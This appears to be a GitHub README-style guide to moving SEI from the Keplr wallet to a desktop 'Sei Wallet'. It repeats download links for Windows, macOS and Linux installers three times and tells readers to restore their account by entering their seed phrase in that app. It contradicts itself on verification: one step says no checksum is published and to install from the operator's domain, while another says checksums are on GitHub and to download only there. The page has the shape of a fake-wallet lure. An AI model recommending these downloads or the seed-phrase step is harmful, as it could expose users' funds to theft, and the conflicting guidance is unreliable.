![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Moving SEI from Keplr to Sei Wallet</h1>

<p align="center">Send from Keplr to the desktop app without losing track of the address form.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

This is the rare migration that is not a rescue. Keplr is an established Cosmos wallet that has supported Sei for years, and it holds your key either way. Moving to a desktop Sei wallet is a preference — usually about staking, address handling or wanting the key outside a browser extension — and because nothing is on fire, you can do it slowly and check each step.

That is also the risk: a calm migration invites shortcuts. The three things that matter are which account you land on, which address form you are looking at, and whether a delegation survives the move.

## Why people move, and why they stay

Keplr is Cosmos-first. It grew up around `sei1`-style addresses, interchain transfers and a long list of Cosmos chains, and it still works well for people whose activity is mostly in that world.

A desktop wallet built specifically for Sei is EVM-first. It opens on `0x` addresses, treats Sei's EVM network as the main surface, and adds things Keplr does not prioritise: a Sei-specific staking interface, Ledger routing for Sei, and a dApp browser scoped to Sei applications.

Neither is wrong. If most of your activity is Cosmos-wide, Keplr's breadth is the point. If Sei is the chain you actually use, a dedicated client removes a layer. What the destination offers, and what it does not promise, is in [what the product actually does](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).

## Before you move: what carries over, and what does not

**Carries over:** the account itself, its balance, its delegations, its transaction history. All of that is chain state addressed by your key.

**Does not carry over:** Keplr's chain list, its saved addresses, its connection permissions to dApps, and any custom settings. You are recreating an account in a new interface, not cloning an app.

**Might look different:** the address you see first. If Keplr showed you the `sei1` form and the new wallet opens on the `0x` form, that is expected rather than alarming — provided the underlying account is the same one.

## Step 1: record the account and the position

Open Keplr, select the Sei account, and write down:

- the address, in the form Keplr displays it;
- whether any SEI is delegated, and to which validator;
- whether the account is protected by a Ledger rather than a software key.

That last item decides the whole procedure. A Ledger-backed account is not imported by typing anything — you connect the device. The details are in [pairing a hardware wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md).

## Step 2: install, and verify what you installed

Install the new wallet from its operator's own domain. Confirm your operating system shows a publisher you recognise before the first launch, and confirm the version the app shows is the version the site describes. This is a two-minute habit that separates a real install from a lookalike.

If you are unsure what "verify" can mean when no verification value is published, the honest answer is that you can check provenance and publisher identity, and you cannot check a published value at all.

## Step 3: restore the account, then compare addresses

Restore from the seed phrase, or connect the Ledger. Then compare the resulting address with what you wrote down.

If it does not match, do not send a test transaction. Step through the wallet's derivation options or add accounts until the known address appears. A mismatch here means "wrong account selected", not "wrong seed phrase", in the overwhelming majority of cases. Wallets choose a default derivation and Keplr's choice may not be the one a new client makes.

## Step 4: understand which address you are looking at

Sei accounts have both a `0x` EVM address and a `sei1` address, and the link between them is an on-chain association rather than a display setting. Keplr users often know the `sei1` form; an EVM-first wallet opens on `0x`. Both are correct.

What matters is which one you hand to a sender. A small test transfer, checked from both views, settles it in a minute and costs almost nothing.

## Step 5: decide about the delegation

Your stake does not need to move. It belongs to the account and will be visible from the new wallet.

- **Leave it.** It keeps earning under the same validator, assuming that validator is still operating.
- **Redelegate.** Immediate, and the usual choice if you want a different validator rather than liquid funds.
- **Unstake.** Starts the unbonding period; rewards stop on that amount.

Leave a liquid balance for fees. Delegate the entire balance and the exit transaction has no fee to draw on, which turns a click into a queue.

## Step 6: do not run two wallets against the same key longer than you need to

Two clients on one key will both work, and that is exactly the problem: the same account can be signed from two places, and it becomes unclear which one you approved something in. Pick one as primary, and treat the other as an export you can return to rather than a parallel account.

If you keep Keplr installed for other Cosmos chains, that is fine — just stop using its Sei account for new activity once the new wallet is confirmed working.

## What to do with the Keplr extension

Nothing drastic. Keplr is a legitimate maintained wallet; uninstalling it is a preference, not a security requirement. If you do remove it, make sure the seed phrase is backed up somewhere physical first, because the extension is not a backup and neither is your browser profile.

## Related migrations

If you are consolidating from several places at once, the other routes are [leaving Compass](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md), [the Leap migration](https://github.com/sei-chain/sei-wallet-setup/blob/main/migrate-an-account-from-leap.md), [leaving Trust Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/send-coins-out-of-trust.md) and [pulling SEI off an exchange](https://github.com/sei-chain/sei-wallet-setup/blob/main/withdraw-from-an-exchange.md).

## Frequently asked questions

**Is Keplr Wallet safe?** It is a long-established Cosmos wallet. No wallet removes every risk, and this article does not track its current maintenance status — check its own channels before relying on it.

**Is Keplr free?** Its documentation describes the wallet itself as free; you pay network fees on the chains you use.

**What type of wallet is Keplr?** A non-custodial Cosmos wallet, shipped as a browser extension and a phone app.

**What is the difference between Keplr and Leap Wallet?** Both are Cosmos wallets; Keplr's chain coverage is broader and its Sei support is older than a Sei-specific client's.

**Do I lose my staking rewards by moving wallets?** No. Delegations and accrued rewards belong to the account, which the new wallet reads.

**Will my address change?** The account does not change; the form you see first might. Check both the `0x` and `sei1` views before telling anyone your address.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [Using a Ledger hardware wallet with Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md)
- [Moving SEI off Compass to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md)
- [Migrating SEI from Leap Wallet to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/migrate-an-account-from-leap.md)
